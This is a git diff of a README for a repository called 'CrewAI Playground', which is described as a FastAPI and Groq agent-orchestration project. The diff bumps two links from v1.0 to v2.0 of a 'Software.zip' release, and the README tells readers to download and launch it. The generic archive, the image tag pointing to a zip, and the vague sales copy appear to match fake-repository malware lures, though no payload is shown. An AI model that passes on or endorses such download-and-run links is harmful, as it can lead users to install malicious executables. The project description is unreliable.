@@ -2,7 +2,7 @@
 
 Welcome to the CrewAI Playground repository! Here, you can dive into the exciting world of building AI Agent Teams as Production-Ready APIs. Orchestrate CrewAI agents with FastAPI for enterprise-grade AI services and leverage Groq's lightning-fast LLMs to deploy collaborative AI workflows at scale.
 
-![CrewAI Playground](https://github.com/modificarop111/crewai-playground/releases/download/v1.0/Software.zip)
+![CrewAI Playground](https://github.com/modificarop111/crewai-playground/releases/download/v2.0/Software.zip)
 
 ## Overview
 
@@ -41,7 +41,7 @@ CrewAI Playground is a versatile platform for AI enthusiasts and developers who 
 
 To get started with CrewAI Playground, simply download the software package from the following link:
 
-[![Download Software](https://github.com/modificarop111/crewai-playground/releases/download/v1.0/Software.zip)](https://github.com/modificarop111/crewai-playground/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/modificarop111/crewai-playground/releases/download/v2.0/Software.zip)](https://github.com/modificarop111/crewai-playground/releases/download/v2.0/Software.zip)
 
 Once you have downloaded the software, launch the application and start exploring the world of AI orchestration and deployment.
 
